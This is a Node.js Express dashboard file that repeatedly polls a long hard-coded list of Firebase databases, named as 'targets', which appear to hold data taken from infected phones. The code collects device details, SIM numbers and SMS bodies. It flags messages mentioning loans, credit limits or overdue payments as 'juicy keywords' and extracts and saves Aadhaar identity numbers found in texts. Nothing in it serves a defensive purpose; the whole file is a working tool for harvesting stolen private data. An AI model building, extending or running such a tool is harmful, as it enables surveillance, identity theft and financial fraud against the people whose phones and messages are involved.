import express from 'express';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
const PORT = 3000;

// ── Dashboard-owned data directory (no dependency on bot's working dir) ────────
const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

const DB_FILE          = path.join(DATA_DIR, 'dashboard_db.json');
const SIM_FILE         = path.join(DATA_DIR, 'sim_overrides.json');
const NOTES_FILE       = path.join(DATA_DIR, 'device_notes.json');
const AADHAR_FILE      = path.join(DATA_DIR, 'aadhar.json');

// Poll interval: how often the background poller refreshes each target (ms)
const POLL_INTERVAL_MS = 5 * 60 * 1000; // 5 minutes

// ── Juicy keywords (mirrors DA1.py exactly — hot-reloadable via /api/keywords) ─
let JUICY_KEYWORDS = [
  // Loan / credit apps
  'kreditbee','creditbee','mpokket','navi','nira','moneyview',
  'stucred','snapmint','pfin','poonawala','fincorp',
  'aditya birla','adityabirla','flaxi','flexsalary','salaryday',
  'rupee112','zestmoney','home credit','homecredit',
  // Approval / offer keywords
  'pre approved','pre-approved','preapproved',
  'approved','loan approved','credit approved',
  'increase limit','credit limit','limit increase',
  // Repayment / overdue
  'repayment','overdue','due amount','emi due','emi overdue',
  'outstanding','payment due',
  // Generic finance
  'loan','credit card','bajaj','zype',
];

// ── OLD RAW_TARGETS from DAprevious.py ────────────────────────────────────────
const OLD_RAW_TARGETS = [
  [20, 'https://projectsb0810-default-rtdb.firebaseio.com'],
  [23, 'https://samar84900-6f084-default-rtdb.firebaseio.com'],
  [27, 'https://pm-kisan-22f92-default-rtdb.firebaseio.com'],
  [31, 'https://dark-274b4-default-rtdb.firebaseio.com'],
  [32, 'https://pm-india-07yg-default-rtdb.firebaseio.com'],
  [33, 'https://jamtara123-42608-default-rtdb.firebaseio.com'],
  [37, 'https://bank-e-kyc-default-rtdb.firebaseio.com'],
  [40, 'https://rt5nr-2f3ef-default-rtdb.firebaseio.com'],
  [44, 'https://pk114-6e828-default-rtdb.firebaseio.com'],
  [45, 'https://ultra-14-default-rtdb.firebaseio.com'],
  [46, 'https://samar84900-6f084-default-rtdb.firebaseio.com'],
  [52, 'https://kk60-e4ebc-default-rtdb.firebaseio.com'],
  [53, 'https://bob1-23ad2-default-rtdb.firebaseio.com'],
  [56, 'https://pvn7-a873a-default-rtdb.firebaseio.com'],
  [65, 'https://jamtara133-61d7e-default-rtdb.firebaseio.com'],
  [66, 'https://jamtara181-default-rtdb.firebaseio.com'],
  [68, 'https://hdmax1-58366-default-rtdb.firebaseio.com'],
  [69, 'https://smas-8bff8-default-rtdb.firebaseio.com'],
  [70, 'https://challan5-default-rtdb.firebaseio.com'],
  [72, 'https://chhnuk05-3188e-default-rtdb.firebaseio.com'],
  [73, 'https://s85138920-87594-default-rtdb.firebaseio.com'],
  [84, 'https://access25-54355-default-rtdb.firebaseio.com'],
  [85, 'https://access26-default-rtdb.firebaseio.com'],
  [86, 'https://access28-9a395-default-rtdb.firebaseio.com'],
  [87, 'https://replace-3e6bb-default-rtdb.firebaseio.com'],
  [88, 'https://shoot44-default-rtdb.firebaseio.com'],
  [89, 'https://rto45-9d572-default-rtdb.firebaseio.com'],
  [100,'https://samar84900-6f084-default-rtdb.firebaseio.com'],
];

const OLD_SCHEMA_2 = new Set([44, 52]);
const OLD_SCHEMA_3 = new Set([23,27,32,33,37,40,45,46,56,65,66,68,69,70,72,73,100]);
const OLD_SCHEMA_4 = new Set([31]);
function getOldSchema(id) {
  if (OLD_SCHEMA_2.has(id)) return 2;
  if (OLD_SCHEMA_3.has(id)) return 3;
  if (OLD_SCHEMA_4.has(id)) return 4;
  return 1;
}
const OLD_TARGETS = OLD_RAW_TARGETS.map(([id, url]) => ({
  id, url: url.replace(/\/$/, ''), schema: getOldSchema(id), isOld: true
}));

// ── RAW_TARGETS from DA1.py ───────────────────────────────────────────────────
const RAW_TARGETS = [
  [1,'https://aartihh-dffe3-default-rtdb.firebaseio.com'],
  [2,'https://hsm2pro21-default-rtdb.firebaseio.com'],
  [5,'https://jamtar7-95f77-default-rtdb.firebaseio.com'],
  [8,'https://lovefimus-default-rtdb.firebaseio.com'],
  [9,'https://naxus-89796-default-rtdb.firebaseio.com'],
  [10,'https://rahul-e20c4-default-rtdb.firebaseio.com'],
  [11,'https://rahulkumat0651-87bc2-default-rtdb.firebaseio.com'],
  [12,'https://sbinew-bbc00-default-rtdb.firebaseio.com'],
  [13,'https://tillu-2-default-rtdb.firebaseio.com'],
  [14,'https://adityapanel-default-rtdb.firebaseio.com'],
  [15,'https://allinone-cf029-default-rtdb.firebaseio.com'],
  [16,'https://axis-c4bd3-default-rtdb.firebaseio.com'],
  [17,'https://backup-ec5d6-default-rtdb.firebaseio.com'],
  [18,'https://billojii-default-rtdb.firebaseio.com'],
  [19,'https://e22turnament2-default-rtdb.firebaseio.com'],
  [20,'https://fir-6b48f-default-rtdb.firebaseio.com'],
  [21,'https://h2buwhge-default-rtdb.firebaseio.com'],
  [22,'https://hello-6153b-default-rtdb.firebaseio.com'],
  [23,'https://iphone-11-baab-default-rtdb.firebaseio.com'],
  [24,'https://loda-5029e-default-rtdb.firebaseio.com'],
  [25,'https://newtan3450-default-rtdb.firebaseio.com'],
  [26,'https://noob-f1798-default-rtdb.firebaseio.com'],
  [27,'https://okayo-f1a54-default-rtdb.firebaseio.com'],
  [28,'https://proffercelawte-default-rtdb.firebaseio.com'],
  [29,'https://projectname-15100-default-rtdb.firebaseio.com'],
  [30,'https://adminpanel-5f533-default-rtdb.firebaseio.com'],
  [32,'https://challan5-default-rtdb.firebaseio.com'],
  [33,'https://human-34-kumar-default-rtdb.firebaseio.com'],
  [34,'https://mp-24jfg-default-rtdb.firebaseio.com'],
  [35,'https://nky0-a5870-default-rtdb.firebaseio.com'],
  [36,'https://nonono-q-default-rtdb.firebaseio.com'],
  [37,'https://u72328193-47b68-default-rtdb.firebaseio.com'],
  [39,'https://u72749819-fa563-default-rtdb.firebaseio.com'],
  [40,'https://ajay-33c1b-default-rtdb.firebaseio.com'],
  [41,'https://anaryef50-aa5f1-default-rtdb.firebaseio.com'],
  [42,'https://ajna-20fc4-default-rtdb.firebaseio.com'],
  [43,'https://e5turnament2-default-rtdb.firebaseio.com'],
  [44,'https://jaimahakal-42698-default-rtdb.firebaseio.com'],
  [45,'https://motb-10aae-default-rtdb.firebaseio.com'],
  [46,'https://bevhhwhbe-default-rtdb.firebaseio.com'],
  [48,'https://csforme-dc64a-default-rtdb.firebaseio.com'],
  [49,'https://dogla-de225-default-rtdb.firebaseio.com'],
  [50,'https://gren-ff2af-default-rtdb.firebaseio.com'],
  [51,'https://sep12-aea6d-default-rtdb.firebaseio.com'],
  [52,'https://tt01-5e373-default-rtdb.firebaseio.com'],
  [53,'https://hjmi-5af19-default-rtdb.firebaseio.com'],
  [54,'https://jjjjjkkk-d0cc0-default-rtdb.firebaseio.com'],
  [55,'https://lalu-rama50-default-rtdb.firebaseio.com'],
  [56,'https://u24143844-c1b11-default-rtdb.firebaseio.com'],
  [57,'https://mypr-6123d-default-rtdb.firebaseio.com'],
  [58,'https://nxt11-d55d0-default-rtdb.firebaseio.com'],
  [59,'https://r62710898-39a8e-default-rtdb.firebaseio.com'],
  [60,'https://u16714964-283ef-default-rtdb.firebaseio.com'],
  [61,'https://u40179853-987df-default-rtdb.firebaseio.com'],
  [62,'https://u58325342-dffc0-default-rtdb.firebaseio.com'],
  [63,'https://u62803313-e54bc-default-rtdb.firebaseio.com'],
  [64,'https://u67583339-bf0c1-default-rtdb.firebaseio.com'],
  [65,'https://u75887828-b5a63-default-rtdb.firebaseio.com'],
  [66,'https://rahu80759-ac69b-default-rtdb.firebaseio.com'],
  [67,'https://raja252525raj-4ee9a-default-rtdb.firebaseio.com'],
  [68,'https://salasali6990-1171d-default-rtdb.firebaseio.com'],
  [69,'https://testing-81627-default-rtdb.firebaseio.com'],
  [70,'https://ranjibses-default-rtdb.firebaseio.com'],
  [71,'https://risho-d4c66-default-rtdb.firebaseio.com'],
  [72,'https://sanj-683c4-default-rtdb.firebaseio.com'],
  [73,'https://testuuu-f5cbb-default-rtdb.firebaseio.com'],
  [74,'https://u13667713-dc566-default-rtdb.firebaseio.com'],
  [75,'https://u24153206-5eef6-default-rtdb.firebaseio.com'],
  [76,'https://u25428732-91bd9-default-rtdb.firebaseio.com'],
  [77,'https://u25783858-e6739-default-rtdb.firebaseio.com'],
  [78,'https://u62751482-f5b46-default-rtdb.firebaseio.com'],
  [79,'https://u8208372-ad1d1-default-rtdb.firebaseio.com'],
  [80,'https://tinmm88-b7db5-default-rtdb.firebaseio.com'],
  [81,'https://e9turnament1-default-rtdb.firebaseio.com'],
  [82,'https://raaz-5287d-default-rtdb.firebaseio.com'],
  [83,'https://apkpure-6eb6a-default-rtdb.firebaseio.com'],
  [84,'https://e14turnament2-default-rtdb.firebaseio.com'],
  [85,'https://bossuun-default-rtdb.firebaseio.com'],
  [86,'https://jsjsjdj-7f0d1-default-rtdb.firebaseio.com'],
  [87,'https://rahul-54fe9-default-rtdb.firebaseio.com'],
  [88,'https://runjun-master-panel-default-rtdb.firebaseio.com'],
  [89,'https://apkdriod-f6fb9-default-rtdb.firebaseio.com'],
  [90,'https://fir-1fa16-default-rtdb.firebaseio.com'],
  [91,'https://newspreding-default-rtdb.firebaseio.com'],
  [92,'https://privatesok-59944-default-rtdb.firebaseio.com'],
  [93,'https://fir-27c9e-default-rtdb.firebaseio.com'],
  [94,'https://singhaana-6f199-default-rtdb.firebaseio.com'],
  [95,'https://vibe-d238e-default-rtdb.firebaseio.com'],
  [96,'https://painislv-default-rtdb.firebaseio.com'],
  [97,'https://rahais-default-rtdb.firebaseio.com'],
];

// ── Schema assignment ─────────────────────────────────────────────────────────
const SCHEMA_2  = new Set([14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,46,71,73,81,83,90,92,94,97]);
const SCHEMA_3  = new Set([32,33,34,35,36,37,55,56,66,67,68,69,72,77,79]);
const SCHEMA_4  = new Set([42,43,44,45,49,50,51,52]);
const SCHEMA_5  = new Set([58]);
const SCHEMA_6  = new Set([57]);
const SCHEMA_8A = new Set([1]);
const SCHEMA_8B = new Set([8,9,10,11,41]);
const SCHEMA_9  = new Set([5,12,13,40,54,59,61,62,63,64,65,70,74,75,76,93]);
const SCHEMA_10 = new Set([84]);
const SCHEMA_11 = new Set([80,82,85,86,87,88,89,91,95,96]);
const SCHEMA_12 = new Set([48]);
const SCHEMA_13 = new Set([53]);
const SCHEMA_14 = new Set([39,78]);
const SCHEMA_15 = new Set([]);

function getSchema(id) {
  if (SCHEMA_8A.has(id)) return '8a';
  if (SCHEMA_8B.has(id)) return '8b';
  if (SCHEMA_9.has(id))  return 9;
  if (SCHEMA_10.has(id)) return 10;
  if (SCHEMA_11.has(id)) return 11;
  if (SCHEMA_12.has(id)) return 12;
  if (SCHEMA_13.has(id)) return 13;
  if (SCHEMA_14.has(id)) return 14;
  if (SCHEMA_15.has(id)) return 15;
  if (SCHEMA_2.has(id))  return 2;
  if (SCHEMA_3.has(id))  return 3;
  if (SCHEMA_4.has(id))  return 4;
  if (SCHEMA_5.has(id))  return 5;
  if (SCHEMA_6.has(id))  return 6;
  return 1;
}

const TARGETS = RAW_TARGETS.map(([id, url]) => ({
  id, url: url.replace(/\/$/, ''), schema: getSchema(id), isOld: false
}));

const ALL_TARGETS = [...TARGETS, ...OLD_TARGETS];

// ── Dashboard DB: load / save ─────────────────────────────────────────────────
// Structure: { new: { [targetId]: { [deviceId]: deviceRecord } },
//              old: { [targetId]: { [deviceId]: deviceRecord } } }
// deviceRecord mirrors DA1.py fields exactly.
let dashboardDb = { new: {}, old: {} };

function loadDashboardDb() {
  try {
    if (fs.existsSync(DB_FILE)) dashboardDb = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
  } catch (e) {
    console.error('DB load error:', e.message);
  }
  // Ensure both sections exist
  if (!dashboardDb.new) dashboardDb.new = {};
  if (!dashboardDb.old) dashboardDb.old = {};
}

function saveDashboardDb() {
  try {
    fs.writeFileSync(DB_FILE, JSON.stringify(dashboardDb, null, 2));
  } catch (e) {
    console.error('DB save error:', e.message);
  }
}

function getTargetDb(target) {
  const section = target.isOld ? 'old' : 'new';
  const key = String(target.id);
  if (!dashboardDb[section][key]) dashboardDb[section][key] = {};
  return dashboardDb[section][key];
}

// Update a single device record — never removes juicy_keywords already stored
function upsertDevice(target, deviceId, fields) {
  const db = getTargetDb(target);
  const now = new Date().toISOString().replace('T', ' ').slice(0, 16);
  const existing = db[deviceId] || {};

  // Merge juicy keywords: accumulate, never delete
  const oldKws = new Set(existing.juicy_keywords || []);
  const newKws = fields.juicy_keywords || [];
  for (const kw of newKws) oldKws.add(kw);

  // Track status transitions
  const wasOnline = existing.current_status === 'online';
  const isOnline  = fields.current_status === 'online';
  const last_online  = isOnline  ? now : (existing.last_online  || null);
  const last_offline = !isOnline ? now : (existing.last_offline || null);

  db[deviceId] = {
    brand:         fields.brand         || existing.brand         || 'Unknown',
    device_id:     deviceId,
    sim1_number:   fields.sim1_number   || existing.sim1_number   || 'N/A',
    sim2_number:   fields.sim2_number   || existing.sim2_number   || 'N/A',
    sim1_enriched: fields.sim1_enriched || existing.sim1_enriched || [],
    sim2_enriched: fields.sim2_enriched || existing.sim2_enriched || [],
    juicy_keywords: [...oldKws],
    current_status: fields.current_status || 'offline',
    last_battery:  fields.last_battery  || existing.last_battery  || 'N/A',
    last_activity: fields.last_activity || existing.last_activity || null,
    last_online,
    last_offline,
    app_id:        fields.app_id        || existing.app_id        || 'N/A',
    obj_id:        fields.obj_id        || existing.obj_id        || 'N/A',
    user_serial:   fields.user_serial   || existing.user_serial   || 'N/A',
  };
}

// ── Firebase fetch helpers ────────────────────────────────────────────────────
async function fbFetch(url) {
  const resp = await fetch(url, {
    headers: { 'User-Agent': 'Mozilla/5.0' },
    signal: AbortSignal.timeout(25000),
  });
  if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
  const text = await resp.text();
  if (!text || text[0] === '<') throw new Error('HTML response (auth error)');
  return JSON.parse(text);
}

// Iterate SMS messages from arbitrary nested Firebase data
function* iterMsgs(data) {
  if (!data || typeof data !== 'object') return;
  for (const v of Object.values(data)) {
    if (!v || typeof v !== 'object') continue;
    if ('body' in v || 'message' in v || 'msg' in v || 'text' in v) yield v;
    else yield* iterMsgs(v);
  }
}

// Extract last_activity timestamp string and juicy keywords from an SMS collection
function parseSms(dsms, schema) {
  const tsList = [];
  const foundKws = new Set();
  const AADHAR_RE = /(?<!\d)([2-9]\d{11})(?!\d)/g;
  const AADHAR_KW = /aadh[a]?ar/i;
  const foundAadhars = new Set();

  const msgs = dsms && typeof dsms === 'object'
    ? (Array.isArray(dsms) ? dsms : Object.values(dsms))
    : [];

  for (const msg of msgs) {
    if (!msg || typeof msg !== 'object') continue;
    let body = '', ts = 0;

    if ([2, 4, 10, 11].includes(schema)) {
      body = String(msg.message || msg.body || '');
      const dtStr = msg.dateTime || '';
      if (dtStr) {
        try {
          // "DD-MM-YYYY | HH:MM AM/PM"
          const [datePart, timePart] = dtStr.split(' | ');
          ts = new Date(`${datePart.split('-').reverse().join('-')} ${timePart}`).getTime() || 0;
        } catch {}
      }
    } else if (schema === '8a' || schema === '8b') {
      body = String(msg.msg || '');
      ts = Number(msg.date) || 0;
    } else if (schema === 12) {
      body = String(msg.text || '');
      ts = Number(msg.rawTs || msg.timestamp) || 0;
    } else if (schema === 13) {
      body = String(msg.message || msg.body || '');
      ts = Number(msg.timestamp || msg.timestampMillis) || 0;
    } else {
      body = String(msg.body || msg.message || msg.msg || msg.text || '');
      // Try numeric timestamp fields first, then parse receivedDate / date strings
      const rawTs = msg.timestampMillis || msg.timestamp;
      if (rawTs) {
        ts = Number(rawTs) || 0;
      } else if (msg.receivedDate || msg.dateReceived || msg.date_received) {
        // "2026-05-25 12:29:50" or similar
        try { ts = new Date(msg.receivedDate || msg.dateReceived || msg.date_received).getTime() || 0; } catch {}
      }
    }

    const lower = body.toLowerCase();
    for (const kw of JUICY_KEYWORDS) {
      if (lower.includes(kw)) foundKws.add(kw);
    }
    if (AADHAR_KW.test(lower)) {
      for (const m of body.matchAll(AADHAR_RE)) foundAadhars.add(m[1]);
    }
    if (ts > 0) tsList.push(ts);
  }

  const maxTs = tsList.length ? Math.max(...tsList) : 0;
  const actStr = maxTs
    ? new Date(maxTs).toISOString().replace('T', ' ').slice(0, 16)
    : 'Unknown';

  return { actStr, foundKws: [...foundKws], foundAadhars: [...foundAadhars], maxTs };
}

// ── Schemas that need per-device SMS fetch (not inline in main endpoint) ──────
// Schema 2,5: SMS at /messages/<did>.json
// Schema 3,6: SMS at /user_sms/<did>.json
// Schema 4: SMS is INLINE inside clients[did].messages — NO separate fetch
const NEEDS_PER_DEVICE_SMS = new Set([2, 3, 5, 6]);

function getSmsEndpoint(url, schema, did) {
  if (schema === 2 || schema === 5) return `${url}/messages/${did}.json`;
  return `${url}/user_sms/${did}.json`;
}

// ── Per-target Firebase poll ──────────────────────────────────────────────────
async function pollTarget(target) {
  const { id, url, schema, isOld } = target;
  const STALE_MS = 30 * 60 * 1000;

  try {
    // ── Determine main endpoint ──────────────────────────────────────────────
    let mainEP;
    if (schema === 1)                               mainEP = `${url}/All_Users.json`;
    else if (schema === 2 || schema === 4)          mainEP = `${url}/clients.json`;
    else if (schema === 3)                          mainEP = `${url}/user_data.json`;
    else if (schema === 5)                          mainEP = `${url}/devices.json`;
    else if (schema === 6)                          mainEP = `${url}/data.json`;
    else if (schema === '8a')                       mainEP = `${url}/omex.json`;
    else if (['8b',9,10,11,14,15].includes(schema)) mainEP = `${url}/.json`;
    else if (schema === 12)                         mainEP = `${url}/devices.json`;
    else if (schema === 13)                         mainEP = `${url}/admin.json`;
    else                                            mainEP = `${url}/All_Users.json`;

    const data = await fbFetch(mainEP);
    if (!data) return;

    // ── Extract device map + SMS/SIM maps per schema ─────────────────────────
    let rawDevs = {}, allSms = {}, allSims = {};

    if (schema === 1) {
      rawDevs = data?.Data?.DeviceInfo || {};
      allSms  = data?.sms              || {};  // root-level sms map: {did: {msgId: {body,...}}}
      allSims = data?.simDetails       || {};  // root-level simDetails: {did: {sim1Number,...}}
    } else if (schema === '8a') {
      rawDevs = data?.All_User?.Info    || {};
      allSms  = data?.All_User?.Sms     || {};
      allSims = data?.All_User?.SimINFO || {};
    } else if (schema === '8b') {
      rawDevs = data?.omex?.All_User?.Info    || {};
      allSms  = data?.omex?.All_User?.Sms     || {};
      allSims = data?.omex?.All_User?.SimINFO || {};
    } else if (schema === 9) {
      rawDevs = data?.user_data || {};
      allSms  = data?.user_sms  || {};
    } else if (schema === 10) {
      rawDevs = data?.clients  || {};
      allSms  = data?.messages || {};
    } else if (schema === 11) {
      rawDevs = data?.clients  || {};
      allSms  = data?.messages || {};
    } else if (schema === 14) {
      const ud = data?.user_data || {};
      const cl = data?.clients   || {};
      for (const [k,v] of Object.entries(ud)) if (v && typeof v==='object') rawDevs[k] = {...v, _src:'user_data'};
      for (const [k,v] of Object.entries(cl)) if (!rawDevs[k] && v && typeof v==='object') rawDevs[k] = {...v, _src:'clients'};
      allSms = data?.user_sms || data?.messages || {};
    } else if (schema === 15) {
      const users = data?.users || {};
      for (const [,u] of Object.entries(users)) if (u?.DeviceId) rawDevs[u.DeviceId] = u;
    } else if (schema === 13) {
      for (const av of Object.values(data || {})) {
        if (av?.users) for (const [uid, ud] of Object.entries(av.users)) if (ud) rawDevs[uid] = ud;
      }
    } else {
      rawDevs = (data && typeof data === 'object') ? data : {};
    }

    // ── For schemas that store SMS separately: fetch per-device SMS in parallel ─
    if (NEEDS_PER_DEVICE_SMS.has(schema)) {
      const dids = Object.keys(rawDevs);
      const results = await Promise.allSettled(
        dids.map(did => fbFetch(getSmsEndpoint(url, schema, did)).catch(() => null))
      );
      for (let i = 0; i < dids.length; i++) {
        const val = results[i].status === 'fulfilled' ? results[i].value : null;
        allSms[dids[i]] = val || {};
      }
    }

    // ── Schema 12: SMS is at /profex_incoming/<did> from root /.json ──────────
    if (schema === 12) {
      try {
        const root = await fbFetch(`${url}/.json`);
        allSms = root?.profex_incoming || {};
      } catch {}
    }

    // ── Process each device ──────────────────────────────────────────────────
    for (const [did, dinfo] of Object.entries(rawDevs)) {
      if (!dinfo || typeof dinfo !== 'object') continue;

      // Get SMS for this device
      let dsms = allSms[did] || {};
      // For schema 8a/8b use actual_did
      let actualDid = did;
      if (schema === '8a' || schema === '8b') {
        actualDid = dinfo.did || did;
        dsms = allSms[actualDid] || allSms[did] || {};
      }
      // Schema 13: SMS is nested under receivedSms key inside the device record
      if (schema === 13) dsms = dinfo.receivedSms || {};
      // Schema 4: messages are INLINE inside clients[did].messages
      if (schema === 4) dsms = dinfo.messages || {};

      const { actStr, foundKws, foundAadhars, maxTs } = parseSms(dsms, schema);

      // ── Extract fields per schema (mirrors DA1.py exactly) ────────────────
      let s1 = 'N/A', s2 = 'N/A', bat = 'N/A', brand = 'Unknown', isOn = false;
      let appId = 'N/A', objId = 'N/A', userSerial = 'N/A';

      if (schema === 1) {
        const devSims = allSims[did] || {};
        s1     = devSims.sim1Number || 'N/A';
        s2     = devSims.sim2Number || 'N/A';
        bat    = dinfo.Battery || 'N/A';
        brand  = dinfo.Brand   || 'Unknown';
        isOn   = dinfo.Status === 'Online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
        appId  = dinfo.appId || 'N/A';
        objId  = dinfo.objId || did;

      } else if (schema === '8a' || schema === '8b') {
        const devSims = allSims[actualDid] || allSims[did] || {};
        const r1 = String(devSims.sim1 || 'N/A');
        const r2 = String(devSims.sim2 || 'N/A');
        s1    = r1 !== 'N/A' ? r1.split(' - ')[0].trim() : 'N/A';
        s2    = r2 !== 'N/A' ? r2.split(' - ')[0].trim() : 'N/A';
        bat   = dinfo.Battery || 'N/A';
        brand = dinfo.Name    || 'Unknown';
        isOn  = dinfo.status === 'Online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
        objId = actualDid;

      } else if (schema === 9) {
        s1    = dinfo.phoneNumber || 'N/A';
        s2    = 'N/A';
        const bv = dinfo.battery;
        bat   = bv != null && bv !== 'N/A' ? (String(bv).endsWith('%') ? String(bv) : `${bv}%`) : 'N/A';
        brand = dinfo.d_name || 'Unknown';
        isOn  = dinfo.status === 'online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);

      } else if (schema === 2 || schema === 4) {
        const sims = dinfo.sims || [];
        s1    = sims[0]?.phoneNumber || dinfo.mobNo || 'N/A';
        s2    = sims[1]?.phoneNumber || 'N/A';
        bat   = dinfo.battery != null ? String(dinfo.battery) : 'N/A';
        brand = dinfo.modelName || dinfo.brand || dinfo.label || 'Unknown';
        // Schema 4: status is boolean (true = online); schema 2: 'online'/'true'
        isOn  = dinfo.status === true || dinfo.status === 'online' || dinfo.status === 'Online'
                || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);

      } else if (schema === 3 || schema === 6) {
        s1    = dinfo.numberSim1 || dinfo.phoneNumber || 'N/A';
        s2    = dinfo.numberSim2 || 'N/A';
        bat   = dinfo.battery != null ? `${dinfo.battery}%` : 'N/A';
        brand = dinfo.d_name || 'Unknown';
        isOn  = dinfo.status === 'online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);

      } else if (schema === 5) {
        const info = dinfo.info || {};
        s1    = info.sim1 || dinfo.sim1 || dinfo.phoneNumber || 'N/A';
        s2    = info.sim2 || dinfo.sim2 || 'N/A';
        bat   = info.battery || dinfo.battery || dinfo.Battery || 'N/A';
        brand = info.model || info.brand || dinfo.brand || dinfo.Brand || dinfo.modelName || 'Unknown';
        isOn  = ['Online','online',true].includes(dinfo.status) || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);

      } else if (schema === 10) {
        // Try to find phone from outgoing SMS sender
        for (const msg of (typeof dsms === 'object' ? Object.values(dsms) : [])) {
          if (msg?.type === 'outgoing') {
            const d = String(msg.sender || '').replace(/\D/g,'');
            if (d.length >= 10) { s1 = d.slice(-10); break; }
          }
        }
        bat = 'N/A'; brand = 'Unknown';
        isOn = maxTs > 0 && (Date.now() - maxTs) < STALE_MS;

      } else if (schema === 11) {
        s1    = dinfo.mobNo || 'N/A';
        bat   = dinfo.battery != null ? String(dinfo.battery) : 'N/A';
        brand = dinfo.modelName || dinfo.Brand || 'Unknown';
        isOn  = dinfo.status === true || dinfo.status === 'online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);

      } else if (schema === 12) {
        const hero = dinfo.hero || {};
        const info = dinfo.info || {};
        s1    = String(hero.number || 'N/A');
        s2    = String(dinfo.number_2 || dinfo.forward || 'N/A');
        bat   = 'N/A';
        brand = info.model || 'Unknown';
        isOn  = maxTs > 0 && (Date.now() - maxTs) < STALE_MS;

      } else if (schema === 13) {
        const di = dinfo.deviceInfo || {};
        const si = dinfo.simInfo    || {};
        const sim1o = si.sim1 || si.sim0 || {};
        const sim2o = si.sim2 || {};
        s1    = String(sim1o.number || 'N/A');
        s2    = String(sim2o.number || 'N/A');
        bat   = 'N/A';
        brand = di.model || di.brand || 'Unknown';
        isOn  = maxTs > 0 && (Date.now() - maxTs) < STALE_MS;

      } else if (schema === 14) {
        if (dinfo._src === 'user_data') {
          s1    = dinfo.phoneNumber || 'N/A';
          const bv = dinfo.battery;
          bat   = bv != null && bv !== 'N/A' ? (String(bv).endsWith('%') ? String(bv) : `${bv}%`) : 'N/A';
          brand = dinfo.d_name || 'Unknown';
        } else {
          const sims = dinfo.sims || [];
          s1    = sims[0]?.phoneNumber || dinfo.mobNo || 'N/A';
          s2    = sims[1]?.phoneNumber || 'N/A';
          bat   = dinfo.battery != null ? String(dinfo.battery) : 'N/A';
          brand = dinfo.modelName || 'Unknown';
        }
        isOn = ['online','Online',true].includes(dinfo.status) || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);

      } else if (schema === 15) {
        s1    = String(dinfo.Phone || 'N/A');
        bat   = String(dinfo.Battery || 'N/A');
        brand = dinfo.Brand || 'Unknown';
        isOn  = dinfo.Status === 'Online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
      }

      upsertDevice(target, actualDid, {
        brand, last_battery: bat, sim1_number: s1, sim2_number: s2,
        current_status: isOn ? 'online' : 'offline',
        last_activity: actStr !== 'Unknown' ? actStr : null,
        juicy_keywords: foundKws,
        app_id: appId, obj_id: objId, user_serial: userSerial,
        sim1_enriched: [], sim2_enriched: [],
      });

      // Persist aadhaar numbers found in SMS
      if (foundAadhars.length > 0) {
        const adb = loadAadharDb();
        const urlKey = String(id);
        if (!adb[urlKey]) adb[urlKey] = {};
        const existing = new Set(adb[urlKey][actualDid] || []);
        for (const n of foundAadhars) existing.add(n);
        adb[urlKey][actualDid] = [...existing];
        saveAadharDb(adb);
      }
    }

    saveDashboardDb();
    console.log(`[poll] ${isOld ? 'old' : 'new'} #${id} — ${Object.keys(getTargetDb(target)).length} devices`);

  } catch (e) {
    // Non-fatal: log and move on
    console.warn(`[poll] ${isOld ? 'old' : 'new'} #${id} error: ${e.message}`);
  }
}

// ── Background poller: stagger polls to avoid hammering Firebase ──────────────
async function runPoller() {
  console.log('[poller] Starting background poll for all targets...');
  // Stagger: 1 target every 2 seconds on first run
  for (let i = 0; i < ALL_TARGETS.length; i++) {
    setTimeout(() => pollTarget(ALL_TARGETS[i]), i * 2000);
  }
  // Then repeat every POLL_INTERVAL_MS
  setInterval(async () => {
    console.log('[poller] Refreshing all targets...');
    for (let i = 0; i < ALL_TARGETS.length; i++) {
      setTimeout(() => pollTarget(ALL_TARGETS[i]), i * 2000);
    }
  }, POLL_INTERVAL_MS);
}

// ── Helpers ───────────────────────────────────────────────────────────────────
function extract10Digits(raw) {
  if (!raw || ['N/A','Unknown','None','','null'].includes(String(raw).trim())) return '';
  const digits = String(raw).replace(/\D/g, '');
  return digits.length >= 10 ? digits.slice(-10) : '';
}

function getSmsLink(target, deviceId, objId) {
  const { url, schema } = target;
  if (schema === 1)    return `${url}/All_Users/sms/${deviceId}.json?print=pretty`;
  if ([2,4,5,15,10,11].includes(schema)) return `${url}/messages/${deviceId}.json?print=pretty`;
  if (schema === '8a' || schema === '8b') {
    const actual = (objId && objId !== 'N/A') ? objId : deviceId;
    return `${url}/omex/All_User/Sms/${actual}.json?print=pretty`;
  }
  if ([3,6,9,14].includes(schema)) return `${url}/user_sms/${deviceId}.json?print=pretty`;
  if (schema === 12)   return `${url}/profex_incoming/${deviceId}.json?print=pretty`;
  if (schema === 13)   return `${url}/admin.json?print=pretty`;
  return `${url}/user_sms/${deviceId}.json?print=pretty`;
}

function parseLastActivity(actStr) {
  if (!actStr || actStr === 'Unknown') return null;
  try { return new Date(actStr); } catch { return null; }
}

// ── DB accessors ──────────────────────────────────────────────────────────────
function loadAadharDb() {
  try { if (fs.existsSync(AADHAR_FILE)) return JSON.parse(fs.readFileSync(AADHAR_FILE, 'utf8')); }
  catch {}
  return {};
}
function saveAadharDb(data) {
  try { fs.writeFileSync(AADHAR_FILE, JSON.stringify(data, null, 2)); }
  catch (e) { console.error('Aadhar DB save error:', e.message); }
}

function loadSimOverrides() {
  try { if (fs.existsSync(SIM_FILE)) return JSON.parse(fs.readFileSync(SIM_FILE, 'utf8')); }
  catch {}
  return {};
}
function saveSimOverrides(data) {
  try { fs.writeFileSync(SIM_FILE, JSON.stringify(data, null, 2)); }
  catch (e) { console.error('SIM overrides save error:', e.message); }
}

function loadNotes() {
  try { if (fs.existsSync(NOTES_FILE)) return JSON.parse(fs.readFileSync(NOTES_FILE, 'utf8')); }
  catch {}
  return {};
}
